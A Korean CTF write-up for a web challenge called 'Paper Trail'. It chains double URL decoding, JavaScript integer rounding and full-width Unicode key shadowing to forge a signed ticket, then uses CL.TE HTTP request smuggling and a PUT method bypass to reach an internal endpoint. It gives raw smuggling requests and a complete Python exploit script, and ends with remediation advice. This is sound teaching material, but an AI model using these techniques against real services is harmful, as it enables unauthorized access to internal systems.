---
title: "[제2회 영남권 사이버 공격 방어 대회] Paper Trail"
date: 2026-10-16 16:27:00 +0900
categories: [CTF/Wargame]
tags: [ctf, web, request-smuggling, parser-differential]
---


## 개요

- 분야: Web
- 목표: 일반 참가자 권한으로 접근할 수 없는 `sealed/ledger`에서 플래그 추출
- 플래그: `flag{framing_and_canonicalization_47b2d1}`

이 문제는 이름 그대로 서로 다른 계층이 동일한 데이터를 다르게 해석하는 문제였다. 핵심은 다음 두 종류의 불일치를 연결하는 것이다.

1. 티켓 서명 계층과 archive worker 사이의 canonicalization 불일치
2. ingress와 upstream HTTP 파서 사이의 request framing 불일치

---

## 1. 공개 인터페이스 확인

루트 페이지와 `/protocol.txt`에서 다음 엔드포인트를 확인할 수 있다.

```text
GET  /api/catalog
GET  /api/ticket
GET  /api/identity
POST /api/submit
POST /api/jobs
GET  /api/jobs/<id>
```

카탈로그에는 다음 레코드가 존재한다.

```json
{
  "records": [
    {
      "document": "public/field-notes",
      "record": "101",
      "operation": "digest",
      "scope": "visitor"
    },
    {
      "document": "public/import-index",
      "record": "9007199254741001",
      "operation": "digest",
      "scope": "visitor"
    },
    {
      "document": "sealed/ledger",
      "record": "9007199254740992",
      "operation": "extract",
      "scope": "curator"
    }
  ]
}
```

정상적인 visitor 티켓은 `public/*`, `digest`, `visitor`만 허용한다. 목표 레코드는 `sealed/ledger`, `extract`, `curator`이므로 여러 필드를 동시에 우회해야 한다.

---

## 2. 티켓 canonicalization 불일치

### 2.1 이중 URL 디코딩

다음 문서명으로 티켓을 요청한다.

```text
public/%252e%252e/sealed/ledger
```

티켓 발급기는 이 값을 `public/*` 경로로 판단해 서명한다. 반면 worker는 처리 과정에서 URL 디코딩을 한 번 더 수행한다.

```text
public/%252e%252e/sealed/ledger
        ↓ decode
public/%2e%2e/sealed/ledger
        ↓ decode/normalize
public/../sealed/ledger
        ↓
sealed/ledger
```

따라서 서명 시점에는 공개 문서지만 실제 처리 시점에는 봉인 문서가 된다.

### 2.2 JavaScript 정수 정밀도 손실

레코드 번호에는 다음 값을 사용한다.

```text
9007199254740993  // 2^53 + 1
```

이 값은 문자열 상태에서는 카탈로그의 봉인 레코드 번호와 다르다. 그러나 JavaScript `Number`로 변환하면 안전한 정수 범위를 넘어 다음과 같이 반올림된다.

```javascript
Number("9007199254740993") === 9007199254740992
```

그 결과 worker는 봉인 원장의 실제 레코드 `9007199254740992`를 선택한다.

### 2.3 이스케이프된 전각 키를 이용한 signed-field shadowing

티켓에는 ASCII 필드를 그대로 유지하면서 전각 ASCII 키를 추가한다.

```json
{
  "operation": "digest",
  "scope": "visitor",
  "\uff4f\uff50\uff45\uff52\uff41\uff54\uff49\uff4f\uff4e": "extract",
  "\uff53\uff43\uff4f\uff50\uff45": "curator"
}
```

두 추가 키를 화면에 표시하면 다음과 같다.

```text
ｏｐｅｒａｔｉｏｎ
ｓｃｏｐｅ
```

검증 계층은 ASCII `operation`과 `scope`만 서명 대상으로 사용하므로 기존 proof가 계속 유효하다. 반면 worker는 전각 ASCII를 반각 ASCII로 접어 처리하며, 뒤에 있는 값이 기존 필드를 덮어쓴다.

중요한 점은 JSON 본문에 전각 문자를 직접 넣는 것이 아니라 `\uff..` 이스케이프로 넣어야 한다는 것이다. 전각 문자를 그대로 넣으면 ingress의 중복 signed-field 검사가 이를 발견해 `DUPLICATE_SIGNED_FIELD`를 반환한다.

최종적으로 각 계층이 보는 값은 다음과 같다.

| 필드 | 서명 검증 계층 | archive worker |
|---|---|---|
| document | `public/%252e%252e/sealed/ledger` | `sealed/ledger` |
| record | `"9007199254740993"` | `9007199254740992` |
| operation | `digest` | `extract` |
| scope | `visitor` | `curator` |

조작한 티켓을 `/api/jobs`에 제출하면 봉인 원장 작업이 생성되고, 결과로 내부 redeem에 사용할 claim이 반환된다.

```json
{
  "claim": "...",
  "redeem_at": "/internal/redeem"
}
```

---

## 3. `/internal/redeem` 접근

외부에서 내부 엔드포인트를 직접 호출하면 gateway가 차단한다. `/api/submit`은 ingress를 거쳐 archive worker로 전달되며, 여기에서 `Content-Length`와 `Transfer-Encoding`을 동시에 사용한 CL.TE request smuggling이 가능했다.

외부 ingress가 보는 요청 본문에는 두 번째 HTTP 요청 전체가 들어 있다. upstream은 chunked body의 `0`에서 첫 요청이 끝났다고 판단하고, 남은 바이트를 새로운 요청으로 처리한다.

```http
POST /api/submit HTTP/1.1
Host: TARGET
Content-Length: <전체 smuggling body 길이>
Transfer-Encoding: chunked

0

PUT /internal/redeem HTTP/1.1
Host: archive-worker
Content-Type: application/json
Content-Length: <claim JSON 길이>

{"claim":"..."}
```

일반적인 `POST /internal/redeem`은 `CURATOR_AUTHORITY_REQUIRED`로 거부됐다. 하지만 내부 라우팅과 권한 미들웨어의 메서드 처리 범위가 달라 `PUT`으로 전달하면 권한 검사 경로를 우회하면서 redeem handler에 도달할 수 있었다.

또한 smuggling 이후 upstream 응답과 외부 요청의 대응 관계가 어긋난다. 따라서 플래그 응답이 최초 공격 연결이 아니라 이후의 정상 요청에 반환될 수 있다. 실제 풀이에서는 `/api/catalog` 같은 안전한 공개 요청을 반복해 응답 큐를 비우며 `flag{`가 포함된 응답을 회수했다.

---

## 4. 전체 익스플로잇 코드

아래 코드는 핵심 흐름을 정리한 예시다. 인스턴스 주소는 실행 시점의 주소로 변경해야 한다.

```python
import json
import socket
import time
import requests

BASE = "http://52.79.35.14:22542"
HOST = "52.79.35.14"
PORT = 22542

s = requests.Session()

# 1. 서명 가능한 public import 경로로 visitor ticket 발급
r = s.get(
    BASE + "/api/ticket",
    params={
        "document": "public/%252e%252e/sealed/ledger",
        "record": "9007199254740993",
    },
)
issued = r.json()
ticket = issued["ticket"]
proof = issued["proof"]

# 2. 전각 ASCII 키를 JSON escape로 추가
ticket["ｏｐｅｒａｔｉｏｎ"] = "extract"
ticket["ｓｃｏｐｅ"] = "curator"

raw_ticket = json.dumps(
    ticket,
    separators=(",", ":"),
    ensure_ascii=True,  # 반드시 \\uff.. 형태로 전송
)

# 3. 봉인 원장 작업 생성
r = s.post(
    BASE + "/api/jobs",
    data=raw_ticket,
    headers={
        "Content-Type": "application/json",
        "X-Archive-Proof": proof,
    },
)
job_path = r.json()["job"]

while True:
    result = s.get(BASE + job_path).json()
    if "claim" in result:
        claim = result["claim"]
        break
    time.sleep(0.1)

# 4. CL.TE smuggling으로 내부 redeem 호출
redeem_body = json.dumps({"claim": claim}, separators=(",", ":"))

smuggled = (
    "0\r\n"
    "\r\n"
    "PUT /internal/redeem HTTP/1.1\r\n"
    "Host: archive-worker\r\n"
    "Content-Type: application/json\r\n"
    f"Content-Length: {len(redeem_body.encode())}\r\n"
    "\r\n"
    + redeem_body
)

outer = (
    "POST /api/submit HTTP/1.1\r\n"
    f"Host: {HOST}:{PORT}\r\n"
    "Content-Type: application/json\r\n"
    "Transfer-Encoding: chunked\r\n"
    f"Content-Length: {len(smuggled.encode())}\r\n"
    "Connection: close\r\n"
    "\r\n"
    + smuggled
)

sock = socket.create_connection((HOST, PORT), timeout=3)
sock.sendall(outer.encode())
sock.close()

# 5. desync된 응답 큐에서 플래그 회수
for _ in range(2000):
    try:
        r = s.get(BASE + "/api/catalog", timeout=1)
    except requests.RequestException:
        continue

    if "flag{" in r.text:
        print(r.text)
        break
```

---

## 5. 취약점 정리 및 대응 방안

### 원인

1. 서명 검증 전후에 서로 다른 URL 디코딩 횟수를 사용했다.
2. 큰 정수 식별자를 문자열과 JavaScript `Number`로 혼용했다.
3. 전각 ASCII 키 정규화가 서명 검증 이후에 수행됐다.
4. ingress와 upstream이 `Content-Length`/`Transfer-Encoding` 충돌을 다르게 처리했다.
5. 내부 redeem의 권한 검사와 실제 handler가 동일한 HTTP 메서드 집합에 적용되지 않았다.

### 대응

- 서명 전에 한 번만 canonicalize하고, 검증 이후에는 signed field를 다시 정규화하지 않는다.
- 레코드 ID는 전 구간에서 문자열 또는 `BigInt`로 처리한다.
- Unicode 키를 허용하지 않거나, 키 정규화 후 중복 여부를 검사한다.
- `Content-Length`와 `Transfer-Encoding`이 동시에 존재하면 즉시 요청을 거부한다.
- 프록시와 upstream에서 동일한 HTTP 파서 및 framing 정책을 사용한다.
- 내부 엔드포인트의 모든 HTTP 메서드에 동일한 인증·인가 미들웨어를 적용하고, 허용 메서드를 명시적으로 제한한다.

---

## Flag

```text
flag{framing_and_canonicalization_47b2d1}
```
